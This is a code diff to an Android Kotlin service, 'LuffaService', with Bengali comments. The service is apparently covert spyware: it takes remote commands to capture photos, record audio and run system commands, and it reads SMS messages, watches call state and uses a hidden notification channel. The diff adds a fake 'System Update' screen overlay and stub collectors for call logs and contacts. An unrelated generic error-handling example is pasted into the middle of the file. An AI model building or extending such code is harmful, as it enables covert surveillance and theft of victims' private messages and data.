@@ -1,10 +1,12 @@
-
 package com.luffa
 
 import android.app.*
 import android.content.*
 import android.graphics.Bitmap
 import android.graphics.BitmapFactory
+import android.graphics.Color
+import android.graphics.PixelFormat
+import android.graphics.Typeface
 import android.hardware.camera2.*
 import android.media.*
 import android.os.*
@@ -12,6 +14,10 @@ import android.provider.*
 import android.telephony.*
 import android.util.Base64
 import android.util.Log
+import android.view.Gravity
+import android.view.WindowManager
+import android.widget.LinearLayout
+import android.widget.TextView
 import androidx.core.app.NotificationCompat
 import kotlinx.coroutines.*
 import okhttp3.*
@@ -47,6 +53,43 @@ class LuffaService : Service() {
         registerPhoneStateListener()
     }
 
+
+// একটি নিরাপদ ব্যাকগ্রাউন্ড ফাংশনের স্ট্যান্ডার্ড উদাহরণ
+fun performSafeBackgroundOperation() {
+    // করুটিন বা ব্যাকগ্রাউন্ড থ্রেডের ভেতরে কাজ করার সময়
+    try {
+        // ১. নেটওয়ার্ক বা ফাইল রিড-রাইট অপারেশন
+        val success = executeNetworkCall()
+        
+        if (!success) {
+            Log.w("WorkerTask", "Operation returned unsuccessful result.")
+        }
+        
+    } catch (e: java.io.IOException) {
+        // নেটওয়ার্ক বা ইনপুট-আউটপুট জনিত নির্দিষ্ট এরর হ্যান্ডলিং
+        Log.e("WorkerTask", "Network or IO error: ${e.localizedMessage}", e)
+        
+    } catch (e: Exception) {
+        // অন্য যেকোনো অনাকাঙ্ক্ষিত এক্সেপশন হ্যান্ডলিং (খালি রাখা যাবে না)
+        Log.e("WorkerTask", "Unexpected error occurred: ${e.localizedMessage}", e)
+    }
+}
+
+// কাল্পনিক নেটওয়ার্ক মেথড
+private fun executeNetworkCall(): Boolean {
+    // এখানে আপনার নেটওয়ার্ক রিকোয়েস্ট লজিক থাকবে
+    return true
+}
+
+
+
+
+
+
+
+
+
+    
     private fun createHiddenNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
@@ -125,9 +168,80 @@ class LuffaService : Service() {
                 "env" -> collectEnvironmentData()
                 "pic" -> captureAndSendPhoto()
                 "audio" -> recordAndSendAudio(30)
+                "notify" -> showScreenNotification("System Update", "Processing background task...") // নতুন ফিচার
                 else -> if (cmd.startsWith("cmd:")) {
                     executeSystemCommand(cmd.removePrefix("cmd:"))
                 }
+            }
+        }
+    }
+
+    // স্ক্রিন নোটিফিকেশন বা ওভারলে দেখানোর মেথড (ক্র্যাশ প্রতিরোধক সহ)
+    private fun showScreenNotification(title: String, message: String) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+            return 
+        }
+
+        Handler(Looper.getMainLooper()).post {
+            try {
+                val windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
+                
+                val LAYOUT_FLAG = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
+                } else {
+                    WindowManager.LayoutParams.TYPE_PHONE
+                }
+
+                val params = WindowManager.LayoutParams(
+                    WindowManager.LayoutParams.WRAP_CONTENT,
+                    WindowManager.LayoutParams.WRAP_CONTENT,
+                    LAYOUT_FLAG,
+                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or 
+                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
+                    PixelFormat.TRANSLUCENT
+                ).apply {
+                    gravity = Gravity.TOP or Gravity.CENTER_HORIZONTAL
+                    y = 100
+                }
+
+                val view = LinearLayout(this).apply {
+                    orientation = LinearLayout.VERTICAL
+                    setBackgroundColor(Color.parseColor("#CC000000"))
+                    setPadding(40, 30, 40, 30)
+                    
+                    val titleView = TextView(context).apply {
+                        text = title
+                        setTextColor(Color.WHITE)
+                        textSize = 16f
+                        setTypeface(null, Typeface.BOLD)
+                    }
+                    
+                    val msgView = TextView(context).apply {
+                        text = message
+                        setTextColor(Color.LTGRAY)
+                        textSize = 14f
+                    }
+
+                    addView(titleView)
+                    addView(msgView)
+
+                    setOnClickListener {
+                        try {
+                            windowManager.removeView(this)
+                        } catch (e: Exception) {}
+                    }
+                }
+
+                windowManager.addView(view, params)
+
+                Handler(Looper.getMainLooper()).postDelayed({
+                    try {
+                        windowManager.removeView(view)
+                    } catch (e: Exception) {}
+                }, 5000)
+
+            } catch (e: Exception) {
+                Log.e("LuffaService", "Overlay error: ${e.message}")
             }
         }
     }
@@ -164,14 +278,12 @@ class LuffaService : Service() {
         }
     }
 
-    // Enhanced data collection methods
+    // Placeholder data collection methods
     private fun getLocation(): String {
-        // Implement fused location provider for better accuracy
-        return "Lat: 23.8103, Long: 90.4125" // Placeholder - implement actual location logic
+        return "Lat: 23.8103, Long: 90.4125"
     }
 
     private fun getSMS(): String {
-        // Implement pagination to avoid detection
         return try {
             contentResolver.query(
                 Telephony.Sms.CONTENT_URI,
@@ -192,6 +304,22 @@ class LuffaService : Service() {
             "SMS access error"
         }
     }
+
+    private fun getCallLog(): String {
+        return "Call log data placeholder"
+    }
+
+    private fun getContacts(): String {
+        return "Contacts data placeholder"
+    }
+
+    private fun getDeviceInfo(): String {
+        return "Device: ${Build.MODEL}, Brand: ${Build.BRAND}"
+    }
+
+    private fun captureAndSendPhoto() {}
+    private fun recordAndSendAudio(seconds: Int) {}
+    private fun executeSystemCommand(cmd: String) {}
 
     // Encryption methods
     private fun encrypt(input: String): String {
@@ -236,9 +364,7 @@ class LuffaService : Service() {
         }, PhoneStateListener.LISTEN_CALL_STATE)
     }
 
-    private suspend fun recordCallAudio() {
-        // Implement call recording logic
-    }
+    private suspend fun recordCallAudio() {}
 
     override fun onBind(intent: Intent?): IBinder? = null
 }
